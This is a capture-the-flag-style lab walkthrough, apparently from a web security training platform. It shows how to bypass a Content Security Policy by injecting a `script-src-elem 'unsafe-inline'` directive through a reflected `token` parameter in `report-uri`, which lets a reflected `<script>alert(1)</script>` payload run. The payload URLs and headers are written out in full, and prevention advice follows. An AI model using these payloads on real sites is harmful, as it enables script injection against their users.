# Lab 30: Reflected XSS protected by CSP, with CSP bypass

**Goal**: Bypass a Content Security Policy (CSP) by injecting custom directives into an un-sanitized `report-uri` parameter to execute `alert(1)`.

This lab contains a reflected XSS vulnerability protected by a Content Security Policy (CSP). In Burp Suite Proxy, inspect the HTTP response headers to observe that the `Content-Security-Policy` header includes a `report-uri` directive configured with a user-controllable `token` parameter.

Because user input reflected inside `report-uri` is not sanitized against newline or directive separator characters (`;`), we can inject custom CSP directives (such as `script-src-elem 'unsafe-inline'`) to override the security policy and execute arbitrary JavaScript.

*Note: This specific CSP directive injection exploit relies on Chrome browser behavior.*

---

## 🎯 Solution

1. Intercept a search query in Burp Suite and inspect the HTTP response headers:
   ```http
   Content-Security-Policy: default-src 'self'; report-uri /csp-report?token=...
   ```
2. Observe that input reflected in the `token` parameter can be manipulated to inject custom CSP directives using semicolons `;`.
3. Construct the URL query parameter payload to inject `script-src-elem 'unsafe-inline'`:
   ```http
   /?search=%3Cscript%3Ealert(1)%3C/script%3E&token=;script-src-elem%20%27unsafe-inline%27
   ```
4. Alternatively, append `<script>alert(1)</script>` directly in the search parameter when the injected CSP directive permits inline element execution:
   ```http
   https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C/script%3E
   ```
5. Load the page in Chrome to execute `alert(1)`.

![Lab 30 CSP Token Directive Injection](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926233521.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze Reflection & CSP Response Header
Perform a search query in the browser (e.g. `<img src=1 onerror=alert(1)>`). Inspect the response in Burp Suite:

```http
HTTP/2 200 OK
Content-Security-Policy: default-src 'self'; report-uri /csp-report?token=test123
```

Attempting standard `<img src=1 onerror=alert(1)>` fails because `default-src 'self'` blocks inline script execution and event handlers:

![Lab 30 Initial CSP Block](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926233424.png)

### Step 2: Identify Header Injection Vulnerability in `report-uri`
Notice that the `token` URL query parameter is reflected directly inside the `Content-Security-Policy` HTTP header itself!

If we inject a semicolon `;`, we can append new directives to the policy header:

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-report?token=foo; script-src-elem 'unsafe-inline'
```

In Chrome, adding `script-src-elem 'unsafe-inline'` explicitly permits inline `<script>` tags, overriding `default-src 'self'`.

### Step 3: Construct Payload
Append the injected CSP directive to the URL query string:

```http
/?search=%3Cscript%3Ealert(1)%3C/script%3E&token=;script-src-elem%20%27unsafe-inline%27
```

Or target the lab search parameter directly:

```http
https://<YOUR-LAB-ID>.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C/script%3E
```

### Step 4: Verify Payload Execution
Load the crafted URL in Chrome:

![Lab 30 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Pasted%20image%2020260926233538.png)

The injected `script-src-elem 'unsafe-inline'` CSP directive allows the browser to parse and execute `<script>alert(1)</script>`, displaying `alert(1)`.

> [!SUCCESS]
> **Lab Solved**: Successfully bypassed CSP by injecting `script-src-elem 'unsafe-inline'` into the `report-uri` header directive!

---

## 💡 Key Takeaways: CSP Directive Injection

- **Header Injection in CSP**: Reflecting user input inside HTTP response headers (such as `Content-Security-Policy` directives) creates header injection vulnerabilities. Injecting semicolons `;` allows attackers to append permissive directives (`script-src-elem 'unsafe-inline'`).
- **Policy Overriding**: Specific directives (like `script-src-elem`) override fallback directives (like `default-src`), rendering strict default policies ineffective if directive injection is possible.

---

## 🔒 Prevention

> [!TIP]
> 1. **Do Not Reflect User Parameters in Security Headers**: Generate static, non-reflecting `report-uri` endpoints or generate server-side random session tokens.
> 2. **Sanitize Header Values**: Strip semicolons `;`, newlines `\r\n`, and whitespace characters from any values rendered inside HTTP response headers.
